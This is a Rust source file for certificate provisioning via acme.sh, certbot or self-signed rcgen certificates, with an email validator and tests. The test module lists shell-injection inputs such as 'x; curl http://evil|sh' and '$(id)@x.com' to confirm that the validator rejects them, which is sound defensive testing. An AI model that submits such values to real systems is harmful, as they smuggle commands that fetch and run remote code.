use rcgen::{CertificateParams, DistinguishedName, DnType, IsCa, KeyPair, KeyUsagePurpose, SanType};
use std::fs;
use std::net::IpAddr;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, SystemTime};
use tracing::info;

use crate::config::{self, CertStrategy};

pub fn certs_dst_dir() -> PathBuf {
    PathBuf::from(config::etc_base())
        .join("sub-maker")
        .join("certs")
}

pub fn ensure_acme(
    domain: &str,
    email: &str,
    mode: CertStrategy,
    cf_token: &str,
) -> anyhow::Result<()> {
    if domain.is_empty() {
        anyhow::bail!("domain required for real cert");
    }
    if !email.is_empty() {
        validate_email(email)?;
    }
    if mode == CertStrategy::AcmeDnsCf && cf_token.is_empty() {
        anyhow::bail!(
            "Cloudflare API token required for acme-dns-cf; re-run setup and provide one \
             (DNS edit scope), or choose another certificate strategy"
        );
    }
    let acme = match acme_bin() {
        Ok(bin) => bin,
        Err(_) => {
            info!("installing acme.sh ...");
            // Email is passed as a positional shell parameter; never interpolate
            // user input into the command string.
            let status = Command::new("sh")
                .arg("-c")
                .arg(r#"curl -fsSL https://get.acme.sh | sh -s -- email="$1""#)
                .arg("sub-maker-acme-install")
                .arg(email)
                .status()?;
            if !status.success() {
                anyhow::bail!("acme install failed");
            }
            PathBuf::from(acme_home()).join("acme.sh")
        }
    };
    if mode == CertStrategy::AcmeDnsCf {
        let output = Command::new(&acme)
            .args([
                "--issue",
                "--dns",
                "dns_cf",
                "-d",
                domain,
                "--keylength",
                "ec-256",
            ])
            .env("CF_Token", cf_token)
            .output()?;
        info!(out = %String::from_utf8_lossy(&output.stdout), "acme dns output");
        if !output.status.success() {
            anyhow::bail!(
                "acme dns: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
        return Ok(());
    }

    let output = Command::new(&acme)
        .args([
            "--issue",
            "--standalone",
            "-d",
            domain,
            "--keylength",
            "ec-256",
        ])
        .output()?;
    info!(out = %String::from_utf8_lossy(&output.stdout), "acme http output");
    if !output.status.success() {
        anyhow::bail!("acme http: {}", String::from_utf8_lossy(&output.stderr));
    }
    Ok(())
}

pub fn ensure_certbot(domain: &str, email: &str) -> anyhow::Result<()> {
    if domain.is_empty() {
        anyhow::bail!("domain required for certbot");
    }
    if which::which("certbot").is_err() {
        install_certbot()?;
    }
    let mut args = vec![
        "certonly".into(),
        "--standalone".into(),
        "-d".into(),
        domain.to_string(),
        "--agree-tos".into(),
        "--non-interactive".into(),
    ];
    if email.is_empty() {
        args.push("--register-unsafely-without-email".into());
    } else {
        args.push("--email".into());
        args.push(email.to_string());
    }
    let output = Command::new("certbot").args(&args).output()?;
    info!(out = %String::from_utf8_lossy(&output.stdout), "certbot output");
    if !output.status.success() {
        anyhow::bail!(
            "certbot issue: {}\n{}",
            output.status,
            String::from_utf8_lossy(&output.stderr)
        );
    }
    Ok(())
}

fn install_certbot() -> anyhow::Result<()> {
    info!("installing certbot");
    let (program, args): (&str, Vec<&str>) = if command_exists("apt-get") {
        (
            "sh",
            vec!["-c", "apt-get update -qq && apt-get install -y -qq certbot"],
        )
    } else if command_exists("dnf") {
        ("dnf", vec!["install", "-y", "certbot"])
    } else if command_exists("yum") {
        ("yum", vec!["install", "-y", "certbot"])
    } else if command_exists("apk") {
        ("apk", vec!["add", "--no-cache", "certbot"])
    } else {
        anyhow::bail!("certbot not found and no supported package manager was detected");
    };
    let output = Command::new(program).args(args).output()?;
    if !output.status.success() {
        anyhow::bail!(
            "install certbot: {}\n{}",
            output.status,
            String::from_utf8_lossy(&output.stderr)
        );
    }
    Ok(())
}

pub fn copy_certs_to_etc(domain: &str) -> anyhow::Result<()> {
    let mut src = PathBuf::from(acme_home()).join(format!("{domain}_ecc"));
    if !src.exists() {
        src = PathBuf::from(acme_home()).join(domain);
    }
    let dst = certs_dst_dir();
    fs::create_dir_all(&dst)?;
    copy_file(
        &src.join("fullchain.cer"),
        &dst.join("fullchain.pem"),
        0o644,
    )?;
    copy_file(
        &src.join(format!("{domain}.key")),
        &dst.join("privkey.pem"),
        0o600,
    )?;
    info!(dst = %dst.display(), "certs copied");
    Ok(())
}

pub fn copy_certbot_certs_to_etc(domain: &str) -> anyhow::Result<()> {
    let src = PathBuf::from("/etc/letsencrypt/live").join(domain);
    let dst = certs_dst_dir();
    fs::create_dir_all(&dst)?;
    copy_file(
        &src.join("fullchain.pem"),
        &dst.join("fullchain.pem"),
        0o644,
    )?;
    copy_file(&src.join("privkey.pem"), &dst.join("privkey.pem"), 0o600)?;
    info!(dst = %dst.display(), "certbot certs copied");
    Ok(())
}

pub fn generate_self_signed_cert(domain: &str, server_addr: &str) -> anyhow::Result<()> {
    let dst = certs_dst_dir();
    fs::create_dir_all(&dst)?;

    let mut names = Vec::new();
    if !domain.is_empty() {
        names.push(domain.to_string());
    }
    let mut params = if names.is_empty() {
        CertificateParams::new(vec!["localhost".into()])?
    } else {
        CertificateParams::new(names.clone())?
    };
    params.distinguished_name = DistinguishedName::new();
    if !domain.is_empty() {
        params
            .distinguished_name
            .push(DnType::CommonName, domain);
    } else {
        params
            .distinguished_name
            .push(DnType::CommonName, "sub-maker");
    }
    params.is_ca = IsCa::NoCa;
    params.key_usages = vec![
        KeyUsagePurpose::DigitalSignature,
        KeyUsagePurpose::KeyEncipherment,
    ];
    params.not_before = (SystemTime::now() - Duration::from_secs(3600)).into();
    params.not_after = (SystemTime::now() + Duration::from_secs(365 * 24 * 3600)).into();
    if !domain.is_empty() {
        params
            .subject_alt_names
            .push(SanType::DnsName(domain.try_into()?));
    }
    if let Ok(ip) = server_addr.parse::<IpAddr>() {
        params.subject_alt_names.push(SanType::IpAddress(ip));
    }

    let key_pair = KeyPair::generate()?;
    let cert = params.self_signed(&key_pair)?;
    let cert_path = dst.join("fullchain.pem");
    let key_path = dst.join("privkey.pem");
    fs::write(&cert_path, cert.pem())?;
    fs::write(&key_path, key_pair.serialize_pem())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&cert_path, fs::Permissions::from_mode(0o644))?;
        fs::set_permissions(&key_path, fs::Permissions::from_mode(0o600))?;
    }
    Ok(())
}

fn command_exists(name: &str) -> bool {
    which::which(name).is_ok()
}

/// Prefers the acme.sh installed under `~/.acme.sh`, then one on PATH.
fn acme_bin() -> anyhow::Result<PathBuf> {
    let home = PathBuf::from(acme_home()).join("acme.sh");
    if home.is_file() {
        return Ok(home);
    }
    which::which("acme.sh").map_err(|_| anyhow::anyhow!("acme.sh not found"))
}

/// Accepts ordinary contact emails only; rejects anything that could not
/// appear in an ACME registration anyway (and that would be hostile in logs).
pub fn validate_email(email: &str) -> anyhow::Result<()> {
    let (local, domain) = email
        .split_once('@')
        .ok_or_else(|| anyhow::anyhow!("invalid email: {email:?}"))?;
    let ok_local = !local.is_empty()
        && local
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'%' | b'+' | b'-'));
    let ok_domain = !domain.is_empty()
        && domain
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
        && !domain.starts_with('-')
        && !domain.starts_with('.');
    if ok_local && ok_domain {
        Ok(())
    } else {
        anyhow::bail!("invalid email: {email:?}")
    }
}

fn acme_home() -> String {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    format!("{home}/.acme.sh")
}

#[cfg(test)]
mod tests {
    use super::{ensure_acme, validate_email};
    use crate::config::CertStrategy;

    #[test]
    fn ensure_acme_requires_cf_token_for_dns01() {
        let err = ensure_acme("proxy.example.com", "ops@example.com", CertStrategy::AcmeDnsCf, "")
            .expect_err("empty CF token must not fall back to HTTP-01");
        assert!(err.to_string().contains("Cloudflare API token"));
    }

    #[test]
    fn validate_email_accepts_plain_addresses_and_rejects_shell_syntax() {
        for ok in ["ops@example.com", "a.b+c@d-1.io"] {
            assert!(validate_email(ok).is_ok(), "should accept {ok:?}");
        }
        for bad in [
            "x; curl http://evil|sh",
            "a`b@x.com",
            "$(id)@x.com",
            "no-at",
            "@x.com",
            "a@",
        ] {
            assert!(validate_email(bad).is_err(), "should reject {bad:?}");
        }
    }
}

fn copy_file(src: &Path, dst: &Path, mode: u32) -> anyhow::Result<()> {
    fs::copy(src, dst)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(dst, fs::Permissions::from_mode(mode))?;
    }
    let _ = mode;
    Ok(())
}
